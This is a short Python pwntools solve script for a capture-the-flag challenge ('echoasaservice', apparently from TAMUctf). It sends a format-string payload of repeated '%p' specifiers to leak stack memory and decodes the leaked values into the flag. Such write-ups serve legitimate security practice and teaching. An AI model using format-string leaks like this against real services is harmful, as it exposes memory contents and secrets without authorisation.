#!/usr/bin/env python2

"""
Run exploit locally with:
./solve.py

./solve.py REMOTE HOST=challenges.tamuctf.com PORT=4251
"""

from __future__ import print_function

import binascii

from pwn import *

PROG_PATH = './echoasaservice'


def init_pwntools_context():
    context.binary = PROG_PATH
    context.terminal = ['tmux', 'vsplit', '-h']

    if not args['REMOTE']:
        context.log_level = 'debug'


def init_io():
    if args['REMOTE']:
        return remote(args['HOST'], int(args['PORT']))
    else:
        pty = process.PTY
        return process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)


def win(io):
    io.recvuntil('(EaaS)\n')
    io.sendline('AAAAAAAA' + '.%p' * 11)

    leaked_qwords = io.recvline().strip().split('.')
    for qword in leaked_qwords[8:]:
        try:
            hex_str = qword[2:].rjust(8, '0')
            decoded_str = binascii.unhexlify(hex_str).decode()
            print(''.join(reversed(decoded_str)), end='')
        except (TypeError, UnicodeDecodeError,):
            break


if __name__ == '__main__':
    init_pwntools_context()
    io = init_io()
    win(io)
